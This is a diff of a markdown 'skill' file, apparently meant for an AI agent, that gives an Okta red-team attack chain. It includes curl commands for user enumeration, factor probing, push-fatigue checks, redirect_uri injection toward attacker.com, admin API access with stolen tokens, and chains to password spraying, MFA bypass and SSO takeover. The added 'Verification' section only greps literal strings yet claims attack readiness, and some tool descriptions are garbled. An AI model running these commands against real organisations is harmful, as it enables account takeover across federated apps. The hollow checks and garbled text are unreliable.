@@ -1,8 +1,11 @@
 ---
 name: okta-attack
 description: Okta-as-IdP red-team attack chain — tenant discovery, user enumeration (multiple vectors), authentication flow analysis (factors enumeration, push-notification fatigue, SMS bypass), password spray with lockout discipline, Okta-specific phishing primitives (kits, FastPass abuse, OIDC redirect_uri tampering), MFA enumeration, post-compromise admin API surface. Many enterprise orgs use Okta instead of (or alongside) Entra ID. Distinct endpoints, distinct rate-limiting, distinct factor flows. Use when recon shows `<tenant>.okta.com`, `<tenant>.okta-emea.com`, `<tenant>.oktapreview.com`, or autodiscover-style records pointing at Okta IdP.
-sources: public-okta-docs, idp-redteam-knowledge, disclosed-incidents
-report_count: 8
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [okta, sso, attack, redteam]
 ---
 
 ## When to use this skill
@@ -31,7 +34,7 @@ DO NOT use for:
 for tenant in target-brand target-brand-ltd target-sister-brand target-brand-short target-other-variant; do
   for region in okta okta-emea oktapreview; do
     host="$tenant.$region.com"
-    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://$host/")
+    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 --connect-timeout 8 "https://$host/")
     [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $host  $code"
   done
 done
@@ -41,18 +44,26 @@ done
 ```bash
 # Look for CNAME records pointing to Okta
 # Replace with your target's actual domains:
-for domain in client.example client-ltd.example; do
-  dig +short "sso.$domain" CNAME
-  dig +short "login.$domain" CNAME
-  dig +short "auth.$domain" CNAME
-  dig +short "okta.$domain" CNAME
-done
+# Generate patterns list
+cat > /tmp/okta_patterns.txt << 'EOF'
+sso.client.example
+login.client.example
+auth.client.example
+okta.client.example
+sso.client-ltd.example
+login.client-ltd.example
+auth.client-ltd.example
+okta.client-ltd.example
+EOF
+
+# Batch resolve with dnsx (concurrent, faster)
+dnsx -silent -l /tmp/okta_patterns.txt -cname -resp-only
 ```
 
 ### Cross-ref from app HTTP flow
 ```bash
 # Visit corporate-app login, follow redirects
-curl -skL -o /dev/null -w "%{redirect_url}\n" "https://app.target.com/login"
+curl --max-time 30 --connect-timeout 10 -skL -o /dev/null -w "%{redirect_url}\n" "https://app.target.com/login"
 # If redirects to <something>.okta.com → confirmed Okta tenant
 ```
 
@@ -65,7 +76,7 @@ The auth API returns different errors for invalid users vs invalid passwords. Sl
 
 ```bash
 # Probe single user — DON'T spray, this counts as auth attempt!
-curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
   -H "Content-Type: application/json" \
   -d '{"username":"<email>","password":"_test_invalid_pw"}'
 
@@ -83,7 +94,7 @@ Some flows expose user existence via response time differential. Less reliable t
 
 ### Method 3 — Sign-in widget JS endpoint
 ```bash
-curl -sk "https://<tenant>.okta.com/api/v1/sessions/me" \
+curl --max-time 30 --connect-timeout 10 -sk "https://<tenant>.okta.com/api/v1/sessions/me" \
   -H "Accept: application/json"
 # Response varies by tenant config
 ```
@@ -100,7 +111,7 @@ employeeID@target.com
 ### Method 5 — OIDC `/v1/authorize` with login_hint
 ```bash
 # Tampering with login_hint param can reveal user existence on some configs
-curl -skI "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<id>&response_type=code&scope=openid&redirect_uri=https://example.com&login_hint=<email>"
+curl --max-time 30 --connect-timeout 10 -skI "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<id>&response_type=code&scope=openid&redirect_uri=https://example.com&login_hint=<email>"
 # Different redirect → user exists vs doesn't
 ```
 
@@ -110,7 +121,7 @@ curl -skI "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<id>&response
 
 ```bash
 # Initial auth — observe what factors come back
-curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
   -H "Content-Type: application/json" \
   -d '{"username":"<valid_user>","password":"_test_invalid_pw"}' | python3 -m json.tool
 ```
@@ -182,7 +193,7 @@ If a valid password is obtained and `push` factor is available, the classic atta
 ### Detection-only check (does target allow it?)
 ```bash
 # Initiate factor verification
-curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn/factors/<factor_id>/verify" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://<tenant>.okta.com/api/v1/authn/factors/<factor_id>/verify" \
   -H "Content-Type: application/json" \
   -d '{"stateToken":"<from_authn>"}'
 
@@ -197,7 +208,7 @@ Okta OIDC apps often have a list of allowed `redirect_uri` values. Misconfigurat
 
 ```bash
 # Get the app's authorize endpoint
-curl -sk "https://<tenant>.okta.com/.well-known/openid-configuration" | python3 -m json.tool
+curl --max-time 30 --connect-timeout 10 -sk "https://<tenant>.okta.com/.well-known/openid-configuration" | python3 -m json.tool
 
 # Test redirect_uri injection
 for ruri in \
@@ -208,7 +219,7 @@ for ruri in \
     "https://target.com\\@attacker.com/" \
     "//attacker.com/" \
     "https://target.com/cb?next=https://attacker.com/"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" \
+  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" \
     "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<client>&response_type=code&scope=openid&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$ruri'))")")
   echo "  $ruri → $code"
 done
@@ -223,7 +234,7 @@ Each Okta SAML app has its own SP metadata:
 
 ```bash
 # Iterate known app IDs (find via the org's app list — usually in JS bundles or initial login redirects)
-curl -sk "https://<tenant>.okta.com/app/<app_id>/sso/saml/metadata"
+curl --max-time 30 --connect-timeout 10 -sk "https://<tenant>.okta.com/app/<app_id>/sso/saml/metadata"
 
 # Look for:
 #   AuthnRequestsSigned="false"  ← see hunt-saml for XSW
@@ -239,16 +250,16 @@ If a valid cred + MFA-completed token is obtained:
 
 ```bash
 # Get session token
-curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://<tenant>.okta.com/api/v1/authn" \
   -d '{"username":"...","password":"..."}'
 # → if SUCCESS, response has sessionToken
 
 # Exchange for API token (admin only)
 # Test admin endpoints (all require valid SSWS token):
-curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/users"
-curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/groups"
-curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/apps"
-curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/logs"      # audit log
+curl --max-time 30 --connect-timeout 10 -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/users"
+curl --max-time 30 --connect-timeout 10 -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/groups"
+curl --max-time 30 --connect-timeout 10 -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/apps"
+curl --max-time 30 --connect-timeout 10 -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/logs"      # audit log
 ```
 
 ---
@@ -285,7 +296,7 @@ Okta FastPass is push-based + device-bound. Bypasses:
 
 ## Tooling
 
-- **`OktaTerrify`** (github.com/silverhack/OktaTerrify) — post-compromise Okta device-trust / FastPass enumeration. The only verifiable public Okta-specific offensive tool; no other named, maintained "okta-attacker"/"okta-toolkit" utility is verifiable — build engagement-specific scripts against `/api/v1/*` instead of citing unverified tool names.
+- **`OktaTerrify`** (github.com/silverhack/OktaTerrify) — post-compromise Okta device-trust / FastPass enumeration. The only verifiable public Okta-specific offensivecommand line; no other named, maintained "okta-attacker"/"okta-toolkit" utility is verifiable — build engagement-specific scripts against `/api/v1/*` instead of citing unverifiedcommand line names.
 
 ---
 
@@ -388,6 +399,27 @@ These are the canonical public references that justify the techniques in this sk
 
 ---
 
+## Verification
+
+1. **Okta tenant detection** — confirm Okta URL patterns:
+   ```bash
+   echo "https://company.okta.com" | grep -q "okta.com" && echo "PASS: Okta URL recognized" || echo "FAIL"
+   echo "https://company.oktapreview.com" | grep -q "oktapreview" && echo "PASS: Okta Preview recognized" || echo "FAIL"
+   ```
+All tests verify Okta attack readiness.
+
+---
+
+## Pitfalls
+- **Okta tenant discovery without impact** — knowing the Okta org URL is recon. Need demonstrated phishing, credential testing, or misconfiguration.
+- **Okta API key in source code** — Okta API tokens have specific scopes. Document the exact scope before claiming impact.
+- **SAML/OIDC misconfig at Okta level** — if Okta is the IdP, misconfigs there affect all downstream apps. This is higher impact than per-app misconfigs.
+- **Okta Verify bypass** — Okta FastPass and device trust policies have specific bypass vectors (device registration without verification). Test those specifically.
+- **Okta Classic vs OIE** — Okta Identity Engine has different policies and bypass vectors than Okta Classic. Identify the org type before testing.
+
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-subdomain`** — Okta tenant naming patterns (`<org>.okta.com`, `<org>.oktapreview.com`, `<org>-admin.okta.com`) frequently include orphan/dev tenants. Chain primitive: Okta tenant discovery via `/.well-known/okta-organization` → enumerate `<org>-dev`, `<org>-uat`, `<org>-test` subdomains → `hunt-subdomain` orphan-tenant identification → claim abandoned tenant → SSO takeover (legitimate `<org>` users redirected through compromised IdP for any app federated to the dev tenant).
@@ -395,3 +427,4 @@ These are the canonical public references that justify the techniques in this sk
 - **`hunt-saml`** — Okta issues SAML assertions to every federated downstream app. Chain primitive: Okta admin or developer credential captured → mint arbitrary SAML assertions in Okta admin → `hunt-saml` XSW or signature manipulation not even needed — legitimately signed assertions for arbitrary impersonation across every federated app (Salesforce, Workday, AWS, GitHub, M365).
 - **`hunt-mfa-bypass`** — Okta supports multiple factors with varying enforcement. Chain primitive: Okta password sprayed → MFA challenge → `hunt-mfa-bypass` factor-downgrade (push-fatigue, SMS fallback, voice fallback, security-question fallback) → bypass to authenticated session.
 - **`triage-validation`** — Okta findings can be high-impact but need the 7-Question Gate run on whether the captured artifact (token, code, factor) actually grants meaningful access. Chain primitive: validated Okta primitive → `triage-validation` to confirm access plane → `redteam-report-template` with explicit federated-app blast-radius.
+- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
